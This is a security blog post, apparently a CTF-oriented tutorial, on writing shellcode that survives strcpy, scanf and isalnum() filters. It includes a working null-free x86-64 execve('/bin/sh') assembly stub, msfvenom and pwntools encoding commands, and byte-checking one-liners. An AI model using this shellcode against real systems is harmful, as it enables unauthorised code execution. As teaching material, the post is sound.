@@ -1,0 +1,165 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#060606" media="(prefers-color-scheme: dark)">
+<meta name="theme-color" content="#f3f3f3" media="(prefers-color-scheme: light)">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>shellcoding under constraints — null-free and alphanumeric — algoatson.github.io</title>
+<meta name="description" content="The input that carries your shellcode is rarely a clean byte channel. strcpy eats your null bytes; an isalnum() filter rejects most opcodes outright. Writing a payload that survives the channel — null-free, or pure [A-Za-z0-9] — is a craft of choosing instructions for their encoding, not just their effect.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/shellcoding-under-constraints/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shellcoding under constraints — null-free and alphanumeric — algoatson.github.io">
+<meta property="og:description" content="The input that carries your shellcode is rarely a clean byte channel. strcpy eats your null bytes; an isalnum() filter rejects most opcodes outright. Writing a payload that survives the channel — null-free, or pure [A-Za-z0-9] — is a craft of choosing instructions for their encoding, not just their effect.">
+<meta property="og:url" content="https://algoatson.github.io/p/shellcoding-under-constraints/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/shellcoding-under-constraints.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="preload" href="/assets/vga.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "shellcoding under constraints — null-free and alphanumeric", "datePublished": "2026-02-02", "dateModified": "2026-02-02", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "The input that carries your shellcode is rarely a clean byte channel. strcpy eats your null bytes; an isalnum() filter rejects most opcodes outright. Writing a payload that survives the channel — null-free, or pure [A-Za-z0-9] — is a craft of choosing instructions for their encoding, not just their effect.", "url": "https://algoatson.github.io/p/shellcoding-under-constraints/", "mainEntityOfPage": "https://algoatson.github.io/p/shellcoding-under-constraints/", "keywords": "pwn, shellcode"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/series/">series</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>shellcoding under constraints — null-free and alphanumeric</h1>
+  <div class="meta"><span>2026-02-02</span><span>3 min read</span><a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/shellcode/">shellcode</a></div>
+</header>
+
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#null-free-pick-instructions-that-dont-encode-0x00">null-free: pick instructions that don't encode 0x00</a></li>
+<li><a href="#alphanumeric-a-decoder-you-can-spell">alphanumeric: a decoder you can spell</a></li>
+<li><a href="#the-mindset">the mindset</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p>A 24-byte <code class="highlight">execve(&quot;/bin/sh&quot;)</code> stub is easy until you notice <em>how</em> it reaches
+memory. Through <code class="highlight">strcpy</code>, a single null byte truncates it. Through <code class="highlight">scanf(&quot;%s&quot;)</code>,
+whitespace cuts it. Through an <code class="highlight">isalnum()</code> filter, almost every opcode is rejected.
+The shellcode has to survive the channel, which means choosing each instruction for
+the bytes it <em>encodes to</em>, not only what it does.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./sc</span></figcaption><div class="target__grid target__grid--solo"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>channels</dt><dd>strcpy (no 0x00) / scanf %s (no whitespace) / isalnum() (only [A-Za-z0-9])</dd></div><div><dt>NX</dt><dd>off  (classic shellcode target)</dd></div></dl></div></figure>
+<h2 id="null-free-pick-instructions-that-dont-encode-0x00">null-free: pick instructions that don't encode 0x00<a class="headerlink" href="#null-free-pick-instructions-that-dont-encode-0x00" title="Permanent link">#</a></h2>
+<p>The usual offenders are zero immediates and certain register encodings. Replace
+them with self-zeroing and small-immediate forms:</p>
+<figure class="codeblock"><figcaption><span class="fname">null-free execve(&#x27;/bin/sh&#x27;)</span><span class="lang">asm</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#null-free-execvebinsh-1">1</a></span>
+<span class="normal"><a href="#null-free-execvebinsh-2">2</a></span>
+<span class="normal"><a href="#null-free-execvebinsh-3">3</a></span>
+<span class="normal"><a href="#null-free-execvebinsh-4">4</a></span>
+<span class="normal"><a href="#null-free-execvebinsh-5">5</a></span>
+<span class="normal"><a href="#null-free-execvebinsh-6">6</a></span>
+<span class="normal"><a href="#null-free-execvebinsh-7">7</a></span>
+<span class="normal"><a href="#null-free-execvebinsh-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="null-free-execvebinsh-1"><span class="hll"><span class="nf">xor</span><span class="w">  </span><span class="no">rsi</span><span class="p">,</span><span class="w"> </span><span class="no">rsi</span><span class="w">          </span><span class="c1">; rsi = 0   (not  mov rsi,0  -&gt; that&#39;s a null immediate)</span>
+</span></span><span id="null-free-execvebinsh-2"><span class="nf">push</span><span class="w"> </span><span class="no">rsi</span><span class="w">               </span><span class="c1">; null terminator for the string</span>
+</span><span id="null-free-execvebinsh-3"><span class="nf">movabs</span><span class="w"> </span><span class="no">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">0x68732f2f6e69622f</span><span class="w">   </span><span class="c1">; &quot;/bin//sh&quot;  — doubled slash avoids a 0x00 byte</span>
+</span><span id="null-free-execvebinsh-4"><span class="hll"><span class="nf">push</span><span class="w"> </span><span class="no">rdi</span>
+</span></span><span id="null-free-execvebinsh-5"><span class="hll"><span class="nf">push</span><span class="w"> </span><span class="no">rsp</span><span class="w"> </span><span class="c1">; pop rdi     ; rdi -&gt; &quot;/bin//sh&quot;</span>
+</span></span><span id="null-free-execvebinsh-6"><span class="nf">xor</span><span class="w">  </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">rdx</span><span class="w">          </span><span class="c1">; rdx = 0  (envp)</span>
+</span><span id="null-free-execvebinsh-7"><span class="nf">push</span><span class="w"> </span><span class="mi">0x3b</span><span class="w"> </span><span class="c1">; pop rax    ; rax = 59 (execve) via small immediate, no null</span>
+</span><span id="null-free-execvebinsh-8"><span class="nf">syscall</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>The recurring tricks: <code class="highlight">xor reg,reg</code> instead of <code class="highlight">mov reg,0</code>; <code class="highlight">push 0x3b; pop rax</code>
+instead of <code class="highlight">mov rax,0x3b</code>; and <code class="highlight">/bin//sh</code> so the eight string bytes contain no
+terminator of their own. Verify before you ship it:</p>
+<figure class="codeblock"><figcaption><span class="fname">confirm the channel will accept it</span><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#confirm-the-channel-will-accept-it-1">1</a></span>
+<span class="normal"><a href="#confirm-the-channel-will-accept-it-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="confirm-the-channel-will-accept-it-1">$ objdump -d sc.o | ... | grep &#39; 00 &#39;      # any null bytes? (want none)
+</span><span id="confirm-the-channel-will-accept-it-2">$ python3 -c &quot;import sys; b=open(&#39;sc.bin&#39;,&#39;rb&#39;).read(); print(0 in b)&quot;   # -&gt; False
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<h2 id="alphanumeric-a-decoder-you-can-spell">alphanumeric: a decoder you can spell<a class="headerlink" href="#alphanumeric-a-decoder-you-can-spell" title="Permanent link">#</a></h2>
+<p>When the filter is <code class="highlight">isalnum()</code>, only a sliver of x86 opcodes are even legal —
+some <code class="highlight">push</code>/<code class="highlight">pop</code>s, <code class="highlight">xor</code>, <code class="highlight">imul</code>, <code class="highlight">inc</code>/<code class="highlight">dec</code>, the <code class="highlight">[A-Za-z0-9]</code> range. You can't
+write <code class="highlight">syscall</code> (<code class="highlight">0f 05</code>) directly in that alphabet. The standard answer is a
+<strong>self-decoding stub</strong>: a tiny loader written <em>entirely</em> in legal bytes that
+reconstructs your real shellcode in memory and jumps to it.</p>
+<ul>
+<li>a legal prologue finds its own address (the alphanumeric equivalent of a
+  <code class="highlight">get-eip</code>),</li>
+<li>then a legal arithmetic loop writes the forbidden bytes (<code class="highlight">0f 05</code>, etc.) into a
+  buffer just ahead of it by adding/subtracting alphanumeric constants,</li>
+<li>then control falls into the decoded payload.</li>
+</ul>
+<p>Hand-rolling that is a puzzle; in practice you generate it and inspect it:</p>
+<figure class="codeblock"><figcaption><span class="fname">generate + sanity-check an alphanumeric encoding</span><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#generate-sanity-check-an-alphanumeric-encoding-1">1</a></span>
+<span class="normal"><a href="#generate-sanity-check-an-alphanumeric-encoding-2">2</a></span>
+<span class="normal"><a href="#generate-sanity-check-an-alphanumeric-encoding-3">3</a></span>
+<span class="normal"><a href="#generate-sanity-check-an-alphanumeric-encoding-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="generate-sanity-check-an-alphanumeric-encoding-1">$ msfvenom -p linux/x64/exec CMD=/bin/sh -e x64/zutto_dekiru -f raw &gt; sc.bin
+</span><span id="generate-sanity-check-an-alphanumeric-encoding-2"># or pwntools: pwnlib.encoders / pwnlib.shellcraft, then verify the alphabet:
+</span><span id="generate-sanity-check-an-alphanumeric-encoding-3">$ python3 -c &quot;b=open(&#39;sc.bin&#39;,&#39;rb&#39;).read(); \
+</span><span id="generate-sanity-check-an-alphanumeric-encoding-4">  print(all(chr(c).isalnum() for c in b))&quot;     # -&gt; True
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<details class="spoiler">
+<summary>the payload the filter let through</summary>
+<p>Pure <code class="highlight">[A-Za-z0-9]</code> going in, a shell coming out — the decoder rebuilt the
+<code class="highlight">syscall</code> the filter would never have passed:
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1">segfault{i_spelled_a_shell_in_letters}
+</span></code></pre></div></td></tr></table></div>
+</figure></p>
+</details>
+<h2 id="the-mindset">the mindset<a class="headerlink" href="#the-mindset" title="Permanent link">#</a></h2>
+<ul>
+<li><strong>Know your alphabet before you write a byte.</strong> The channel (<code class="highlight">strcpy</code>, <code class="highlight">%s</code>,
+  <code class="highlight">isalnum</code>, sometimes "printable ASCII only") defines the legal set; design to it.</li>
+<li><strong>Encoding ≠ effect.</strong> Two instructions with the same effect can have wildly
+  different bytes; shellcoding is choosing the encoding that fits the channel.</li>
+<li><strong>Decoders buy you everything.</strong> If the legal alphabet can express a loop and a
+  write, it can express a decoder, and a decoder can reconstruct <em>any</em> payload.
+  That's why even a brutal filter rarely means "no shellcode."</li>
+</ul>
+<p>NX makes all of this moot on modern targets — you ROP instead. But on the boxes
+where shellcode still runs (kernels, embedded, JIT pages, CTF), getting bytes past
+a hostile parser is its own small discipline, and it's a satisfying one.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><div class="row"><span class="row__date">2026-06-15</span><a class="row__tag" href="/tags/heap/">heap</a><a class="row__title" href="/p/house-of-apple-2/">House of Apple 2 — FSOP after the hooks died</a><span class="row__min">4 min</span></div><div class="row"><span class="row__date">2026-06-14</span><a class="row__tag" href="/tags/heap/">heap</a><a class="row__title" href="/p/house-of-spirit/">the House of Spirit</a><span class="row__min">4 min</span></div><div class="row"><span class="row__date">2026-06-14</span><a class="row__tag" href="/tags/heap/">heap</a><a class="row__title" href="/p/poison-null-byte/">the poison null byte</a><span class="row__min">3 min</span></div></div></section>
+<nav class="pager"><a class="prev" href="/p/angr-symbolic-crackme/"><span class="lbl">&#8249; newer</span>angr — let the solver read the check for you</a><a class="next" href="/p/ret2libc-warmup/"><span class="lbl">older &#8250;</span>ret2libc on a warm-up: stack smash to shell</a></nav></main>
+
+    <footer class="status">
+      <span>48 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h2>keys</h2><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
